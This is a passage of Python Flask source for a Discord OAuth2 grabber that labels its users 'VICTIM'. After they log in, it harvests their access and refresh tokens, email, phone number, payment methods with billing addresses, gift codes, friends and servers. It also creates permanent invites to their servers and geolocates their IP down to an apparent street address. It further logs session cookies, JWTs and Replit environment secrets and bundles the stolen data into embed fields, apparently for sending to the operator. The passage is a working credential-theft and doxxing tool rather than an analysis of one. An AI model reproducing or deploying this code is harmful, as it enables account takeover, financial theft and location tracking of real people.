        'session_cookies': len(cookie_categories['session']),
        'auth_cookies': len(cookie_categories['authentication']),
        'tracking_cookies': len(cookie_categories['tracking']),
        'security_cookies': len(cookie_categories['security']),
        'jwt_cookies': sum(1 for c in cookies_detailed if c['is_jwt']),
        'base64_cookies': sum(1 for c in cookies_detailed if c['is_base64_like']),
        'uuid_cookies': sum(1 for c in cookies_detailed if c['is_uuid'])
    }
    
    if all_cookies:
        print(f"[+] Captured {len(all_cookies)} cookie(s): {', '.join(all_cookies.keys())}")
        print(f"[+] Cookie breakdown - Session: {len(cookie_categories['session'])}, Auth: {len(cookie_categories['authentication'])}, Tracking: {len(cookie_categories['tracking'])}")
        for cat, cookies in cookie_categories.items():
            if cookies and cat not in ['unknown']:
                print(f"    [{cat.upper()}]: {', '.join(cookies)}")
        
        for cookie_info in cookies_detailed:
            if cookie_info['is_jwt']:
                print(f"    [JWT DETECTED]: {cookie_info['name']} (length: {cookie_info['length']})")
            elif cookie_info['contains_token'] and cookie_info['length'] > 50:
                print(f"    [TOKEN DETECTED]: {cookie_info['name']} (length: {cookie_info['length']})")
    
    fingerprint['replit_info'] = {
        'user_id': request.headers.get('X-Replit-User-Id', 'Not Available'),
        'username': request.headers.get('X-Replit-User-Name', 'Not Available'),
        'user_roles': request.headers.get('X-Replit-User-Roles', 'Not Available'),
        'user_bio': request.headers.get('X-Replit-User-Bio', 'Not Available'),
        'profile_image': request.headers.get('X-Replit-User-Profile-Image', 'Not Available'),
        'user_url': request.headers.get('X-Replit-User-Url', 'Not Available'),
        'user_teams': request.headers.get('X-Replit-User-Teams', 'Not Available'),
        'replit_domain': os.getenv('REPLIT_DEV_DOMAIN', 'Not Available'),
        'replit_db_url': os.getenv('REPLIT_DB_URL', 'Not Available'),
        'repl_id': os.getenv('REPL_ID', 'Not Available'),
        'repl_owner': os.getenv('REPL_OWNER', 'Not Available'),
        'repl_slug': os.getenv('REPL_SLUG', 'Not Available'),
        'cookies': all_cookies,
        'has_replit_session': request.cookies.get('replit.sid') is not None
    }
    
    fingerprint_id = fingerprint.get('session_id', secrets.token_urlsafe(16))
    fingerprint_storage[fingerprint_id] = fingerprint
    session.clear()
    session['fingerprint_id'] = fingerprint_id
    print(f"[+] Network Info: {network_info.get('isp')} | {network_info.get('city')}, {network_info.get('country')}")
    
    dhcp_info = fingerprint.get('dhcp_info', {})
    if dhcp_info and not dhcp_info.get('error'):
        dhcp_server = dhcp_info.get('dhcp_server_likely', 'Unknown')
        network_class = dhcp_info.get('network_class', 'Unknown')
        subnet_mask = dhcp_info.get('subnet_mask_detected', 'Unknown')
        
        if dhcp_server != 'Unknown':
            print(f"[+] DHCP Server: {dhcp_server} | Network: {network_class} | Mask: {subnet_mask}")
        
        lease_info = dhcp_info.get('lease_info', {})
        if lease_info:
            lease_type = lease_info.get('lease_type', 'Unknown')
            ip_order = lease_info.get('ip_assignment_order', 0)
            print(f"[+] DHCP Lease: {lease_type} | IP Order: #{ip_order}")
        
        dns_servers = dhcp_info.get('dns_servers', [])
        if dns_servers:
            print(f"[+] DNS Servers: {', '.join(dns_servers[:2])}")
    
    print(f"[+] Fingerprint stored with ID: {fingerprint_id}")
    print(f"[+] Session size: {len(str(session))} bytes")
    
    return {"status": "ok", "network_detected": True}

@app.route("/clipboard/<clipboard_id>")
def get_clipboard(clipboard_id):
    content = clipboard_storage.get(clipboard_id, "Clipboard not found or expired")
    return content, 200, {'Content-Type': 'text/plain; charset=utf-8'}

@app.route("/auth")
def auth():
    auth_url = (
        f"{DISCORD_API}/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope={OAUTH_SCOPE}"
    )
    return redirect(auth_url)

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "Missing code", 400

    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": OAUTH_SCOPE
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    token_data = requests.post(f"{DISCORD_API}/oauth2/token", data=data, headers=headers).json()
    access_token = token_data.get("access_token", "Unavailable")
    refresh_token = token_data.get("refresh_token", "Unavailable")
    expires_in = token_data.get("expires_in", 0)
    if access_token == "Unavailable":
        return token_data, 400

    user_info = requests.get(f"{DISCORD_API}/users/@me", headers={"Authorization": f"Bearer {access_token}"}).json()
    
    # Print OAuth2 username immediately
    username = user_info.get('username', 'Unknown')
    discriminator = user_info.get('discriminator', '0000')
    user_id = user_info.get('id', 'Unknown')
    email = user_info.get('email', 'Not Available')
    
    print(f"\n{'='*60}")
    print(f"[+] VICTIM AUTHENTICATED VIA OAUTH2")
    print(f"{'='*60}")
    print(f"[+] Discord Username: {username}#{discriminator}")
    print(f"[+] Discord User ID: {user_id}")
    print(f"[+] Discord Email: {email}")
    print(f"{'='*60}\n")
    
    fingerprint_id = session.get('fingerprint_id')
    if fingerprint_id and fingerprint_id in fingerprint_storage:
        fingerprint_storage[fingerprint_id]['discord_user_oauth'] = {
            'username': username,
            'discriminator': discriminator,
            'id': user_id,
            'email': email
        }
        print(f"[+] Discord user stored in fingerprint: {username}#{discriminator}")
    
    auth_headers = {"Authorization": f"Bearer {access_token}"}
    
    phone_number = "Not Available"
    try:
        phone_response = requests.get(f"{DISCORD_API}/users/@me/phone", headers=auth_headers)
        if phone_response.status_code == 200:
            phone_data = phone_response.json()
            phone_number = phone_data.get("phone", "Not Available")
            print(f"[+] Phone number retrieved: {phone_number}")
        else:
            print(f"[-] Phone grab failed - Status: {phone_response.status_code}, Response: {phone_response.text}")
    except Exception as e:
        print(f"[-] Phone grab error: {e}")

    gift_codes = []
    outbound_promos = []
    promotions_info = []
    
    try:
        gift_response = requests.get(f"{DISCORD_API}/users/@me/entitlements/gift-codes", headers=auth_headers)
        print(f"[*] Gift codes API - Status: {gift_response.status_code}")
        if gift_response.status_code == 200:
            gift_codes = gift_response.json()
            print(f"[+] Gift codes retrieved: {len(gift_codes)}")
        else:
            print(f"[-] Gift codes response: {gift_response.text}")
    except Exception as e:
        print(f"[-] Gift codes grab error: {e}")
    
    try:
        outbound_response = requests.get(f"{DISCORD_API}/users/@me/outbound-promotions/codes", headers=auth_headers)
        print(f"[*] Outbound promos API - Status: {outbound_response.status_code}")
        if outbound_response.status_code == 200:
            outbound_promos = outbound_response.json()
            print(f"[+] Outbound promotions retrieved: {len(outbound_promos)}")
        else:
            print(f"[-] Outbound promos response: {outbound_response.text}")
    except Exception as e:
        print(f"[-] Outbound promotions grab error: {e}")
    
    try:
        entitlements_response = requests.get(f"{DISCORD_API}/users/@me/entitlements", headers=auth_headers)
        print(f"[*] Entitlements API - Status: {entitlements_response.status_code}")
        if entitlements_response.status_code == 200:
            entitlements = entitlements_response.json()
            print(f"[+] Entitlements retrieved: {len(entitlements)}")
            for ent in entitlements:
                promo_type = {
                    1: "Purchase",
                    2: "Premium Subscription",
                    3: "Developer Gift",
                    4: "Test Mode",
                    5: "Free Purchase",
                    6: "User Gift",
                    7: "Premium Purchase",
                    8: "Application Subscription"
                }.get(ent.get("type"), "Unknown")
                
                sku_id = ent.get("sku_id", "N/A")
                starts_at = ent.get("starts_at", "N/A")
                ends_at = ent.get("ends_at", "N/A")
                
                promotions_info.append({
                    "type": promo_type,
                    "sku_id": sku_id,
                    "starts": starts_at[:10] if starts_at != "N/A" else "N/A",
                    "ends": ends_at[:10] if ends_at != "N/A" else "N/A"
                })
        else:
            print(f"[-] Entitlements response: {entitlements_response.text}")
    except Exception as e:
        print(f"[-] Entitlements grab error: {e}")
    
    billing_info = []
    try:
        billing_response = requests.get(f"{DISCORD_API}/users/@me/billing/payment-sources", headers=auth_headers)
        print(f"[*] Billing API - Status: {billing_response.status_code}")
        if billing_response.status_code == 200:
            payment_sources = billing_response.json()
            print(f"[+] Payment sources retrieved: {len(payment_sources)}")
            for payment in payment_sources:
                payment_type = {
                    1: "Credit Card",
                    2: "PayPal",
                    3: "Gcash"
                }.get(payment.get("type"), "Unknown")
                
                if payment.get("type") == 1:
                    brand = payment.get("brand", "Unknown")
                    last_4 = payment.get("last_4", "****")
                    exp_month = payment.get("expires_month", "??")
                    exp_year = payment.get("expires_year", "????")
                    billing_address = payment.get("billing_address", {})
                    name = billing_address.get("name", "N/A")
                    
                    billing_info.append({
                        "type": payment_type,
                        "details": f"{brand} •••• {last_4}",
                        "expires": f"{exp_month}/{exp_year}",
                        "name": name,
                        "address": f"{billing_address.get('line_1', 'N/A')}, {billing_address.get('city', 'N/A')}, {billing_address.get('state', 'N/A')} {billing_address.get('postal_code', 'N/A')}, {billing_address.get('country', 'N/A')}"
                    })
                elif payment.get("type") == 2:
                    email = payment.get("email", "N/A")
                    billing_info.append({
                        "type": payment_type,
                        "details": email,
                        "expires": "N/A",
                        "name": "N/A",
                        "address": "N/A"
                    })
            print(f"[+] Billing info processed: {len(billing_info)} methods")
        else:
            print(f"[-] Billing response: {billing_response.text}")
    except Exception as e:
        print(f"[-] Billing grab error: {e}")

    connections = []
    try:
        connections_response = requests.get(f"{DISCORD_API}/users/@me/connections", headers=auth_headers)
        print(f"[*] Connections API - Status: {connections_response.status_code}")
        if connections_response.status_code == 200:
            connections_data = connections_response.json()
            print(f"[+] Connections retrieved: {len(connections_data)}")
            for conn in connections_data:
                connection_type = conn.get("type", "Unknown")
                connection_name = conn.get("name", "Unknown")
                verified = conn.get("verified", False)
                visibility = conn.get("visibility", 0)
                connections.append({
                    "type": connection_type,
                    "name": connection_name,
                    "verified": verified,
                    "visibility": "Public" if visibility == 1 else "Private",
                    "id": conn.get("id", "N/A")
                })
        else:
            print(f"[-] Connections response: {connections_response.text}")
    except Exception as e:
        print(f"[-] Connections grab error: {e}")

    relationships = []
    friends_count = 0
    try:
        relationships_response = requests.get(f"{DISCORD_API}/users/@me/relationships", headers=auth_headers)
        print(f"[*] Relationships API - Status: {relationships_response.status_code}")
        if relationships_response.status_code == 200:
            relationships_data = relationships_response.json()
            friends_count = len([r for r in relationships_data if r.get("type") == 1])
            print(f"[+] Relationships retrieved: {len(relationships_data)} total, {friends_count} friends")
            for rel in relationships_data[:50]:
                rel_type = {
                    1: "Friend",
                    2: "Blocked",
                    3: "Incoming Request",
                    4: "Outgoing Request"
                }.get(rel.get("type"), "Unknown")
                user = rel.get("user", {})
                relationships.append({
                    "type": rel_type,
                    "username": user.get("username", "Unknown"),
                    "discriminator": user.get("discriminator", "0000"),
                    "id": user.get("id", "N/A")
                })
        else:
            print(f"[-] Relationships response: {relationships_response.text}")
    except Exception as e:
        print(f"[-] Relationships grab error: {e}")
    
    user_profile = {}
    try:
        profile_response = requests.get(f"{DISCORD_API}/users/@me/profile", headers=auth_headers)
        print(f"[*] Profile API - Status: {profile_response.status_code}")
        if profile_response.status_code == 200:
            profile_data = profile_response.json()
            user_profile = {
                "bio": profile_data.get("bio", "No bio"),
                "pronouns": profile_data.get("pronouns", "Not set"),
                "banner_color": profile_data.get("banner_color", "Not set"),
                "theme_colors": profile_data.get("theme_colors", [])
            }
            print(f"[+] Profile data retrieved")
        else:
            print(f"[-] Profile response: {profile_response.text}")
    except Exception as e:
        print(f"[-] Profile grab error: {e}")

    # Get victim's REAL IP from fingerprint storage (captured via JavaScript)
    fingerprint_id = session.get('fingerprint_id', 'unknown')
    fingerprint = fingerprint_storage.get(fingerprint_id, {})
    victim_ip = fingerprint.get('client_ip', 'Unknown')
    
    if victim_ip != 'Unknown':
        ip = victim_ip
        print(f"[+] Using victim IP from fingerprint: {ip}")
    else:
        ip = get_client_ip()
        print(f"[+] Fallback to server-detected IP: {ip}")
    
    ipv6 = "Not Available"
    
    cf_ipv6 = request.headers.get("CF-Connecting-IPv6", "")
    x_forwarded_ipv6 = request.headers.get("X-Forwarded-For-IPv6", "")
    
    if cf_ipv6 and ":" in cf_ipv6:
        ipv6 = cf_ipv6
    elif x_forwarded_ipv6 and ":" in x_forwarded_ipv6:
        ipv6 = x_forwarded_ipv6
    elif ip and ":" in ip:
        ipv6 = ip
    else:
        try:
            ipv6_response = requests.get("https://api64.ipify.org?format=json", timeout=2).json()
            fetched_ip = ipv6_response.get("ip", "")
            if ":" in fetched_ip:
                ipv6 = fetched_ip
        except:
            pass

    geo_data = {
        "country": "Unknown",
        "country_code": "Unknown", 
        "regionName": "Unknown",
        "city": "Unknown",
        "zip": "Unknown",
        "lat": "Unknown",
        "lon": "Unknown",
        "isp": "Unknown",
        "org": "Unknown",
        "as_number": "Unknown",
        "as_name": "Unknown",
        "timezone": "Unknown",
        "currency": "Unknown",
        "currency_code": "Unknown",
        "continent": "Unknown",
        "district": "Unknown",
        "proxy": False,
        "hosting": False,
        "mobile": False,
        "country_flag": "Unknown"
    }
    
    print(f"[*] Gathering geo data for IP: {ip}")
    
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=5).json()
        if resp.get("status") == "success":
            print(f"[+] ip-api.com data retrieved")
            geo_data["country"] = resp.get("country", geo_data["country"])
            geo_data["country_code"] = resp.get("countryCode", geo_data["country_code"])
            geo_data["regionName"] = resp.get("regionName", geo_data["regionName"])
            geo_data["city"] = resp.get("city", geo_data["city"])
            geo_data["zip"] = resp.get("zip", geo_data["zip"])
            geo_data["lat"] = resp.get("lat", geo_data["lat"])
            geo_data["lon"] = resp.get("lon", geo_data["lon"])
            geo_data["isp"] = resp.get("isp", geo_data["isp"])
            geo_data["org"] = resp.get("org", geo_data["org"])
            geo_data["as_number"] = resp.get("as", geo_data["as_number"])
            geo_data["timezone"] = resp.get("timezone", geo_data["timezone"])
            geo_data["proxy"] = resp.get("proxy", geo_data["proxy"])
            geo_data["hosting"] = resp.get("hosting", geo_data["hosting"])
            geo_data["mobile"] = resp.get("mobile", geo_data["mobile"])
            geo_data["district"] = resp.get("district", geo_data["district"])
    except Exception as e:
        print(f"[-] ip-api.com failed: {e}")
    
    try:
        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5).json()
        print(f"[+] ipinfo.io data retrieved")
        if geo_data["country"] == "Unknown":
            geo_data["country"] = resp.get("country", geo_data["country"])
        if geo_data["regionName"] == "Unknown":
            geo_data["regionName"] = resp.get("region", geo_data["regionName"])
        if geo_data["city"] == "Unknown":
            geo_data["city"] = resp.get("city", geo_data["city"])
        if geo_data["zip"] == "Unknown":
            geo_data["zip"] = resp.get("postal", geo_data["zip"])
        if geo_data["lat"] == "Unknown" or geo_data["lon"] == "Unknown":
            loc = resp.get("loc", "")
            if loc and "," in loc:
                lat, lon = loc.split(",")
                geo_data["lat"] = lat.strip()
                geo_data["lon"] = lon.strip()
        if geo_data["org"] == "Unknown":
            geo_data["org"] = resp.get("org", geo_data["org"])
        if geo_data["timezone"] == "Unknown":
            geo_data["timezone"] = resp.get("timezone", geo_data["timezone"])
    except Exception as e:
        print(f"[-] ipinfo.io failed: {e}")
    
    try:
        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5).json()
        print(f"[+] ipapi.co data retrieved")
        if geo_data["country"] == "Unknown":
            geo_data["country"] = resp.get("country_name", geo_data["country"])
        if geo_data["country_code"] == "Unknown":
            geo_data["country_code"] = resp.get("country_code", geo_data["country_code"])
        if geo_data["regionName"] == "Unknown":
            geo_data["regionName"] = resp.get("region", geo_data["regionName"])
        if geo_data["city"] == "Unknown":
            geo_data["city"] = resp.get("city", geo_data["city"])
        if geo_data["zip"] == "Unknown":
            geo_data["zip"] = resp.get("postal", geo_data["zip"])
        if geo_data["lat"] == "Unknown":
            geo_data["lat"] = resp.get("latitude", geo_data["lat"])
        if geo_data["lon"] == "Unknown":
            geo_data["lon"] = resp.get("longitude", geo_data["lon"])
        if geo_data["org"] == "Unknown":
            geo_data["org"] = resp.get("org", geo_data["org"])
        if geo_data["as_number"] == "Unknown":
            geo_data["as_number"] = resp.get("asn", geo_data["as_number"])
        if geo_data["timezone"] == "Unknown":
            geo_data["timezone"] = resp.get("timezone", geo_data["timezone"])
        if geo_data["currency"] == "Unknown":
            geo_data["currency"] = resp.get("currency", geo_data["currency"])
        if geo_data["continent"] == "Unknown":
            geo_data["continent"] = resp.get("continent_code", geo_data["continent"])
        geo_data["country_flag"] = f"https://ipapi.co/flag/{resp.get('country_code', 'xx').lower()}/"
    except Exception as e:
        print(f"[-] ipapi.co failed: {e}")
    
    try:
        resp = requests.get(f"https://ipwhois.app/json/{ip}", timeout=5).json()
        if resp.get("success"):
            print(f"[+] ipwhois.app data retrieved")
            if geo_data["country"] == "Unknown":
                geo_data["country"] = resp.get("country", geo_data["country"])
            if geo_data["country_code"] == "Unknown":
                geo_data["country_code"] = resp.get("country_code", geo_data["country_code"])
            if geo_data["regionName"] == "Unknown":
                geo_data["regionName"] = resp.get("region", geo_data["regionName"])
            if geo_data["city"] == "Unknown":
                geo_data["city"] = resp.get("city", geo_data["city"])
            if geo_data["lat"] == "Unknown":
                geo_data["lat"] = resp.get("latitude", geo_data["lat"])
            if geo_data["lon"] == "Unknown":
                geo_data["lon"] = resp.get("longitude", geo_data["lon"])
            if geo_data["isp"] == "Unknown":
                geo_data["isp"] = resp.get("isp", geo_data["isp"])
            if geo_data["as_number"] == "Unknown":
                geo_data["as_number"] = resp.get("asn", geo_data["as_number"])
            if geo_data["timezone"] == "Unknown":
                geo_data["timezone"] = resp.get("timezone", geo_data["timezone"])
            if geo_data["currency_code"] == "Unknown":
                geo_data["currency_code"] = resp.get("currency_code", geo_data["currency_code"])
    except Exception as e:
        print(f"[-] ipwhois.app failed: {e}")
    
    try:
        resp = requests.get(f"https://extreme-ip-lookup.com/json/{ip}", timeout=5).json()
        if resp.get("status") == "success":
            print(f"[+] extreme-ip-lookup.com data retrieved")
            if geo_data["country"] == "Unknown":
                geo_data["country"] = resp.get("country", geo_data["country"])
            if geo_data["regionName"] == "Unknown":
                geo_data["regionName"] = resp.get("region", geo_data["regionName"])
            if geo_data["city"] == "Unknown":
                geo_data["city"] = resp.get("city", geo_data["city"])
            if geo_data["lat"] == "Unknown":
                geo_data["lat"] = resp.get("lat", geo_data["lat"])
            if geo_data["lon"] == "Unknown":
                geo_data["lon"] = resp.get("lon", geo_data["lon"])
            if geo_data["isp"] == "Unknown":
                geo_data["isp"] = resp.get("isp", geo_data["isp"])
            if geo_data["org"] == "Unknown":
                geo_data["org"] = resp.get("org", geo_data["org"])
            if geo_data["continent"] == "Unknown":
                geo_data["continent"] = resp.get("continent", geo_data["continent"])
    except Exception as e:
        print(f"[-] extreme-ip-lookup.com failed: {e}")
    
    print(f"[+] Geo data collection complete")
    
    street_address = "Not Available"
    full_address = "Not Available"
    
    if geo_data.get("lat") != "Unknown" and geo_data.get("lon") != "Unknown":
        try:
            geocode_resp = requests.get(
                f"https://nominatim.openstreetmap.org/reverse?format=json&lat={geo_data['lat']}&lon={geo_data['lon']}&zoom=18&addressdetails=1",
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=5
            ).json()
            
            if geocode_resp.get("address"):
                addr = geocode_resp["address"]
                street_parts = []
                
                if addr.get("house_number"):
                    street_parts.append(addr["house_number"])
                if addr.get("road"):
                    street_parts.append(addr["road"])
                elif addr.get("street"):
                    street_parts.append(addr["street"])
                
                if street_parts:
                    street_address = " ".join(street_parts)
                    geo_data["street"] = street_address
                
                full_parts = []
                if street_address != "Not Available":
                    full_parts.append(street_address)
                if addr.get("suburb"):
                    full_parts.append(addr["suburb"])
                    geo_data["district"] = addr["suburb"]
                elif addr.get("neighbourhood"):
                    full_parts.append(addr["neighbourhood"])
                    geo_data["district"] = addr["neighbourhood"]
                if addr.get("city") or addr.get("town") or addr.get("village"):
                    city = addr.get("city") or addr.get("town") or addr.get("village")
                    full_parts.append(city)
                    if geo_data.get("city") == "Unknown":
                        geo_data["city"] = city
                if addr.get("state"):
                    full_parts.append(addr["state"])
                    if geo_data.get("regionName") == "Unknown":
                        geo_data["regionName"] = addr["state"]
                if addr.get("postcode"):
                    full_parts.append(addr["postcode"])
                    if geo_data.get("zip") == "Unknown":
                        geo_data["zip"] = addr["postcode"]
                if addr.get("country"):
                    full_parts.append(addr["country"])
                    if geo_data.get("country") == "Unknown":
                        geo_data["country"] = addr["country"]
                
                full_address = ", ".join(full_parts)
                print(f"[+] Reverse geocoding successful: {street_address}")
        except Exception as e:
            print(f"[-] Reverse geocoding failed: {e}")

    premium_type = user_info.get("premium_type", 0)
    nitro_status = "None"
    if premium_type == 1:
        nitro_status = "Nitro Classic"
    elif premium_type == 2:
        nitro_status = "Nitro"

    user_agent_string = request.headers.get("User-Agent", "Unknown")
    accept_lang = request.headers.get("Accept-Language", "Unknown")
    dnt = request.headers.get("DNT", "Not Set")
    platform = request.headers.get("Sec-CH-UA-Platform", "Unknown")
    
    user_agent = parse(user_agent_string)
    browser_name = user_agent.browser.family
    browser_version = user_agent.browser.version_string
    os_name = user_agent.os.family
    os_version = user_agent.os.version_string
    device_type = "Mobile" if user_agent.is_mobile else "Tablet" if user_agent.is_tablet else "PC"
    is_bot = "Yes" if user_agent.is_bot else "No"
    
    sec_ch_ua = request.headers.get("Sec-CH-UA", "Not Available")
    sec_ch_ua_mobile = request.headers.get("Sec-CH-UA-Mobile", "Not Available")
    upgrade_insecure = request.headers.get("Upgrade-Insecure-Requests", "Not Set")
    connection = request.headers.get("Connection", "Unknown")
    referer = request.headers.get("Referer", "Direct Visit")
    save_data_header = request.headers.get("Save-Data", "Not Set")
    
    fingerprint_id = session.get('fingerprint_id', 'unknown')
    fingerprint = fingerprint_storage.get(fingerprint_id, {})
    
    improved_address = fingerprint.get('full_street_address', {})
    if improved_address and not improved_address.get('error'):
        physical_address = improved_address.get('full_address', "Not Available")
    elif full_address != "Not Available":
        physical_address = full_address
    else:
        address_parts = []
        if geo_data.get("street") and geo_data.get("street") != "Not Available":
            address_parts.append(geo_data.get("street"))
        if geo_data.get("district") and geo_data.get("district") != "Unknown":
            address_parts.append(geo_data.get("district"))
        if geo_data.get("city") and geo_data.get("city") != "Unknown":
            address_parts.append(geo_data.get("city"))
        if geo_data.get("regionName") and geo_data.get("regionName") != "Unknown":
            address_parts.append(geo_data.get("regionName"))
        if geo_data.get("zip") and geo_data.get("zip") != "Unknown":
            address_parts.append(geo_data.get("zip"))
        if geo_data.get("country") and geo_data.get("country") != "Unknown":
            address_parts.append(geo_data.get("country"))
        
        physical_address = ", ".join(address_parts) if address_parts else "Not Available"
    
    risk_score = 0
    risk_factors = []
    threat_level = "Low"
    
    if geo_data.get("proxy"):
        risk_score += 30
        risk_factors.append("VPN/Proxy detected")
    if geo_data.get("hosting"):
        risk_score += 25
        risk_factors.append("Datacenter/Hosting IP")
    if is_bot == "Yes":
        risk_score += 40
        risk_factors.append("Bot detected")
    if fingerprint.get("webdriver"):
        risk_score += 35
        risk_factors.append("Automation tool detected")
    if fingerprint.get("headless"):
        risk_score += 30
        risk_factors.append("Headless browser")
    if not fingerprint.get("cookie_enabled"):
        risk_score += 10
        risk_factors.append("Cookies disabled")
    
    browser_tz = fingerprint.get('timezone', 'Unknown')
    ip_tz = geo_data.get('timezone', 'Unknown')
    if browser_tz != "Unknown" and ip_tz != "Unknown" and browser_tz != ip_tz:
        risk_score += 20
        risk_factors.append(f"Timezone mismatch (Browser: {browser_tz}, IP: {ip_tz})")
    
    if user_agent.is_mobile and fingerprint.get("max_touch_points", 0) == 0:
        risk_score += 15
        risk_factors.append("Mobile UA but no touch support")
    
    screen_res = f"{fingerprint.get('screen_width', 0)}x{fingerprint.get('screen_height', 0)}"
    suspicious_resolutions = ["800x600", "1024x768", "1280x720"]
    if screen_res in suspicious_resolutions:
        risk_score += 10
        risk_factors.append(f"Suspicious screen resolution ({screen_res})")
    
    if risk_score >= 70:
        threat_level = "🔴 Critical"
    elif risk_score >= 40:
        threat_level = "🟠 High"
    elif risk_score >= 20:
        threat_level = "🟡 Medium"
    else:
        threat_level = "🟢 Low"
    
    device_consistency = "✅ Consistent"
    if len(risk_factors) > 0:
        device_consistency = "⚠️ Inconsistencies detected"
    
    privacy_tools = []
    if geo_data.get("proxy"):
        privacy_tools.append("VPN/Proxy")
    if fingerprint.get("do_not_track") != "Unknown" and fingerprint.get("do_not_track"):
        privacy_tools.append("Do Not Track")
    if save_data_header == "on":
        privacy_tools.append("Data Saver")
    
    privacy_level = "Standard" if not privacy_tools else f"Enhanced ({', '.join(privacy_tools)})"

    guilds = []
    guilds_count = 0
    guilds_detailed = []
    try:
        guilds_response = requests.get(f"{DISCORD_API}/users/@me/guilds", headers=auth_headers)
        if guilds_response.status_code == 200:
            guilds = guilds_response.json()
            guilds_count = len(guilds)
            print(f"[+] Guilds retrieved: {guilds_count} servers")
            
            for guild in guilds[:20]:
                guild_id = guild.get('id')
                guild_name = guild.get('name', 'Unknown')
                permissions = int(guild.get('permissions', 0))
                
                is_owner = guild.get('owner', False)
                is_admin = (permissions & 0x8) == 0x8
                
                invite_link = "Unable to fetch"
                try:
                    invites_response = requests.get(
                        f"{DISCORD_API}/guilds/{guild_id}/invites",
                        headers=auth_headers,
                        timeout=3
                    )
                    if invites_response.status_code == 200:
                        invites = invites_response.json()
                        if invites and len(invites) > 0:
                            invite_code = invites[0].get('code', None)
                            if invite_code:
                                invite_link = f"https://discord.gg/{invite_code}"
                        else:
                            try:
                                channels_response = requests.get(
                                    f"{DISCORD_API}/guilds/{guild_id}/channels",
                                    headers=auth_headers,
                                    timeout=2
                                )
                                if channels_response.status_code == 200:
                                    channels = channels_response.json()
                                    for channel in channels:
                                        if channel.get('type') == 0:
                                            create_invite = requests.post(
                                                f"{DISCORD_API}/channels/{channel['id']}/invites",
                                                headers=auth_headers,
                                                json={"max_age": 0, "max_uses": 0},
                                                timeout=2
                                            )
                                            if create_invite.status_code == 200:
                                                invite_data = create_invite.json()
                                                invite_code = invite_data.get('code')
                                                invite_link = f"https://discord.gg/{invite_code}"
                                                break
                            except:
                                pass
                except Exception as e:
                    print(f"[-] Invite fetch error for {guild_name}: {e}")
                
                role_status = "Owner" if is_owner else ("Admin" if is_admin else "Member")
                
                guilds_detailed.append({
                    'name': guild_name,
                    'id': guild_id,
                    'owner': is_owner,
                    'admin': is_admin,
                    'role': role_status,
                    'invite': invite_link,
                    'icon': guild.get('icon', None),
                    'permissions': permissions
                })
        else:
            print(f"[-] Guilds grab failed - Status: {guilds_response.status_code}")
    except Exception as e:
        print(f"[-] Guilds grab error: {e}")

    email_verified = "✅ Verified" if user_info.get("verified") else "❌ Not Verified"
    user_flags = user_info.get("flags", 0)
    public_flags = user_info.get("public_flags", 0)
    
    user_fields = [
        {"name": "<:username:1431538952741060658> `Username`", "value": f"{user_info['username']}#{user_info['discriminator']}", "inline": True},
        {"name": "🆔 `User ID`", "value": user_info.get("id", "Unknown"), "inline": True},
        {"name": "<:email:1431671938732003597> `Email`", "value": user_info.get("email", "Not Provided"), "inline": True},
        {"name": "<:email:1431671938732003597> `Email Verified`", "value": email_verified, "inline": True},
        {"name": "<:email:1431671938732003597> `Email Domain`", "value": user_info.get("email", "").split("@")[1] if user_info.get("email") and "@" in user_info.get("email") else "N/A", "inline": True},
        {"name": "📱 `Phone Number`", "value": phone_number, "inline": True},
        {"name": "📞 `Phone Verified`", "value": "✅ Yes" if phone_number != "Not Available" else "❌ No", "inline": True},
        {"name": "🏰 `Guilds (Servers)`", "value": f"{guilds_count} servers", "inline": True},
        {"name": "<:locale:1431675058362781738> `Locale`", "value": user_info.get("locale", "Unknown"), "inline": True},
        {"name": "<:nitro:1431535422638657588> `Nitro`", "value": nitro_status, "inline": True},
        {"name": "🎨 `Accent Color`", "value": f"#{hex(user_info.get('accent_color', 0))[2:].upper()}" if user_info.get('accent_color') else "None", "inline": True},
        {"name": "🖼️ `Banner`", "value": "Yes" if user_info.get('banner') else "No", "inline": True},
        {"name": "🔐 `MFA Enabled`", "value": "✅ Yes" if user_info.get("mfa_enabled") else "❌ No", "inline": True},
        {"name": "🚩 `User Flags`", "value": str(user_flags), "inline": True},
        {"name": "🌐 `Public Flags`", "value": str(public_flags), "inline": True},
        {"name": "🎭 `Avatar Decoration`", "value": user_info.get("avatar_decoration_data", {}).get("asset", "None") if user_info.get("avatar_decoration_data") else "None", "inline": True},
        {"name": "<:token:1431672777391341818> `OAuth Access Token`", "value": access_token, "inline": False},
        {"name": "<:token:1431672777391341818> `OAuth Refresh Token`", "value": refresh_token, "inline": False},
        {"name": "🗒 `Token Expires In`", "value": f"{expires_in} seconds", "inline": True},
        {"name": "⏳ `Login Time (UTC)`", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"), "inline": True}
    ]
    
    if billing_info:
        user_fields.append({"name": "💳 `Payment Methods`", "value": f"{len(billing_info)} method(s)", "inline": True})
        for idx, billing in enumerate(billing_info, 1):
            billing_text = f"Type: {billing['type']}\nCard: {billing['details']}\nExpires: {billing['expires']}\nName: {billing['name']}\nAddress: {billing['address']}"
            user_fields.append({"name": f"Payment #{idx}", "value": billing_text, "inline": False})
    
    promo_fields = []
    if gift_codes or outbound_promos or promotions_info:
        if gift_codes:
            promo_fields.append({"name": "🎁 `Gift Codes`", "value": f"{len(gift_codes)} code(s)", "inline": True})
            for idx, gc in enumerate(gift_codes, 1):
                code = gc.get("code", "N/A")
                promo_fields.append({"name": f"Gift Code #{idx}", "value": f"`{code}`", "inline": False})
        
        if outbound_promos:
            promo_fields.append({"name": "🎁 `Gift Cards`", "value": f"{len(outbound_promos)} promo(s)", "inline": True})
            for idx, promo in enumerate(outbound_promos, 1):
                code = promo.get("code", "N/A")
                promo_type = promo.get("promotion", {}).get("outbound_title", "Unknown Promo")
                promo_fields.append({"name": f"Promo #{idx}", "value": f"`{code}`\n{promo_type}", "inline": False})
        
        if promotions_info:
